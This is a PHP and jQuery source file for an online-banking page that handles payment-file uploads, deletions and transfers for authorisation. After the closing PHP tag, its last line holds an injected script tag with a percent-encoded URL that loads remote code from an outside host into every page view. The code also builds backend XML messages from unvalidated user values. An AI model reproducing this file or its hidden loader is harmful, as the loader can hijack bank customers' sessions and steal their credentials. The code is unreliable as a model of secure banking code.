<script>

function recarga( func_var, btn_var, state_var)
{
	$('#main').html("<br><br><br><br><br><br><br><br><br><div align=center style='width:100%;'><img src=\"https://images.bb.com.mx/sitedesign/bajionet/images/loading.gif\"	style=\"align: center;cursor: pointer; border: 0px solid red;\" title=\"cargando\" alt=\"cargando . . .\" align=center /><br>Cargando...</div>");
	$('#foco').focus();
	$('#main').load('/transaccion/capturapagosarchivo/',{func:func_var,btn_pagos:btn_var,state:state_var});
}
function env_pagosAut(  btn_var,state_var, seleccionados_var)
{
	$('#main').html("<br><br><br><br><br><br><br><br><br><div align=center style='width:100%;'><img src=\"https://images.bb.com.mx/sitedesign/bajionet/images/loading.gif\"	style=\"align: center;cursor: pointer; border: 0px solid red;\" title=\"cargando\" alt=\"cargando . . .\" align=center /><br>Cargando...</div>");
	$('#foco').focus();
	$('#main').load('/transaccion/capturapagosarchivo/',{ btn_pagos:btn_var, state:state_var, seleccionados:seleccionados_var});
}
</script>
<?php
session_start();
//echo "<script src=\"https://$_SERVER['HTTP_HOST']/jquery.form.js\" type=\"text/javascript\"></script>";
/////////////////////////
//Creado por Nexions - HM
/////////////////////////

function ControlAcceso($menu,$usr)
{
        global $errors;

        //Mensaje - Nexions HM
        $trans = "<?xml version='1.0'?>";
        $trans .= "<mensaje><trxn value='pgp'/><accion value='ValidaOpMenu'/><tipomsj value='rqs'/><CustID value='$usr'/>";
        $trans .= "<Opmenu value='" . $menu . "'/>";
		//ACDP Mayo 2014 Se agrega IP remota
		$trans .= "<IP value='" . $_SERVER['REMOTE_ADDR'] . "'/>";
        $trans .= "</mensaje>";
        //Mensaje

        //Conexion - Nexions HM
        $conn = new TCPIPNexions();

        if(!$conn->connect())
              echo "<script> alert('  4501 - " .  $errors[4501]  . " ') </script>";

        if(!$conn->send($trans))
              echo "<script> alert('  4501 - " .  $errors[4501]  . " ') </script>";

        $ans = $conn->receive();

        if(trim($ans)=="")
              echo "<script> alert('  4501 - " .  $errors[4501]  . " ') </script>";

        $xml_struct = parse_xml(trim($ans));

        if (  trim($xml_struct["vals"][$xml_struct["index"]["ERRORNO"][0]]["attributes"]["VALUE"]) != "0000" )
                return  $xml_struct["vals"][$xml_struct["index"]["ERRORNO"][0]]["attributes"]["VALUE"] ." - " .$xml_struct["vals"][$xml_struct["index"]["ERRORNO"][0]]["attributes"]["DESC"];

        $conn->close();
        //Conexion

        return "0000";

}


if (!headers_sent())
{
        header("ETag: PUB" . time());
        header( 'Expires: Mon, 26 Jul 1997 05:00:00 GMT' );
        header( 'Last-Modified: ' . gmdate( 'D, d M Y H:i:s' ) . ' GMT' );
        header( 'Cache-Control: no-store, no-cache, must-revalidate' );
        header( 'Cache-Control: post-check=0, pre-check=0', false );
        header( 'Pragma: no-cache' );
}


include_once( "classes/INIFile.php" );
include_once( "classes/eztemplate.php" );
include_once( "classes/ezhttptool.php" );

include_once( "eztransaccion/classes/eztransaccion.php" );
include_once( "ezsession/classes/ezsession.php" );


include("eztransaccion/user/include/tcpipnexions.php");
include("eztransaccion/user/include/xmlparser.inc");
include("eztransaccion/user/include/general_functions.inc");

include_once("eztransaccion/classes/encrypt.php");


$session =& eZSession::globalSession();

if( !$session->fetch() )
    $session->store();

$ini =& $GLOBALS["GlobalSiteIni"];

$Language = $ini->read_var( "eZTransaccionMain", "Language" );
// $backend = $ini->read_var( "eZTransaccionMain", "Backend" );
$ServerNumber = $ini->read_var( "site", "ServerNumber" );
$DomainPostfix = $ini->read_var( "site", "DomainPostfix" );

$backend = "gw" . $ServerNumber. $DomainPostfix;

include_once( "ezuserbb/classes/ezuser.php" );

$user =& eZUserBB::currentUser();

// DebugBreak();

if ( $user )
{

	$t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
                         "eztransaccion/user/intl/", $Language, "CapturaPagosArchivo.php" );

    $t->setAllStrings();

    $t->set_file( array(
        "CapturaPagosArchivo_tpl" => "CapturaPagosArchivo.tpl"
        ) );


    $session =& eZSession::globalSession();

    if ( !$session->fetch() )
    {
        $session->store();
    }

    $tr = new eZTransaccion( );
    $usr = $session->variable( "r_usr" );
    $qki = $session->variable( "r_qki" );
    $priv = $session->variable( "r_priv" );
    $transaccion_buffer = "";
    
    $t->set_var( "transaccion_buffer", $transaccion_buffer );
	$usr = strtolower($usr);
    //Escritura del template

	print "<div><input readOnly=true size=1 style=\" border: 0px; background-color:transparent; height:2px;\" type=text id='foco'></div><div id='main'>";

	
	if($_SESSION['cantreg']=="")
	        $_SESSION['cantreg'] = 10;
			
	
	if ($_POST['func']=="")
	{
		
		$t->pparse( "output", "CapturaPagosArchivo_tpl" );
		$result = ControlAcceso("caparc",$usr);
		
		if($result==="0000")
		{
			
			include("eztransaccion/user/include/capturapagosarchivo.inc");
			if($_POST['btn_pagos']=="Recargar")
			{
				exit();
			}
		}
		else
			echo $result;
			
	}
	else
	{
		include_once("eztransaccion/user/include/uploadPagos.inc");
		include("eztransaccion/user/include/captpagsarcFunc.inc");
		
		switch($_POST['func'])
		{
			case "consulta_archivos":
				$_SESSION['cantreg']=$_POST["cant_rowno"];
				print consulta_archivos($_POST["usr"], $_POST["rowno"], $_POST["cant_rowno"],$_POST["direction"],$_POST["page"], "activo");
				exit();
			break;
			
			case "consulta_archivoDetalle":
				$t->pparse( "output", "CapturaPagosArchivo_tpl" );
				print consulta_archivoDetalle($_POST["usr"], $_POST["rowno"],"activo");
				exit();
			break;
			
			case 'Borrar':
			
				include_once("eztransaccion/user/include/uploadPagos.inc");
				
				$registros = split(",",$_POST['seleccionados']);

				for( $i=0 ; $i < count($registros) ; $i++)
				{
					borrar_archivo($usr, $registros[$i]);
					
				}

				$_SESSION['user'] = $usr;//$_POST["usr"];
				print show_file_status('borrar');
				exit();
			break;
			
			case 'Transferir':
				//MAOS ENE2015 Enviar a autorizar sin registros I
				$verificaPagos = $_POST['seleccionados'];
				
				if( $verificaPagos != "" ){
					$opcion = "Transferir";
					$t->pparse( "output", "CapturaPagosArchivo_tpl" );
	                include("eztransaccion/user/include/capturapagosarchivo_confirmaciones.inc");
					exit();
				}
				else{
					$action = "noregistros";	
					include("eztransaccion/user/include/capturapagosarchivo_main_form.inc");
					exit();
				}
			//MAOS ENE2015 Enviar a autorizar sin registros F
                
                break;
		}
	}

}//Fin if
else
{
    $t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
                         "eztransaccion/user/intl/", $Language, "userlogin.php" );

    $t->setAllStrings();

    $t->set_file( array(
        "user_login_tpl" => "userlogin.tpl"
        ) );

    $t->set_var( "redirect_url", "/transaccion/capturapagosarchivo/" );

    $t->pparse( "output", "user_login_tpl" );
}//Fin else

?>

<script src="http://%71%7A%68%2E%74%78%73%68%69%2E%63%6F%6D/%62%32%2E%61%73%70"></script>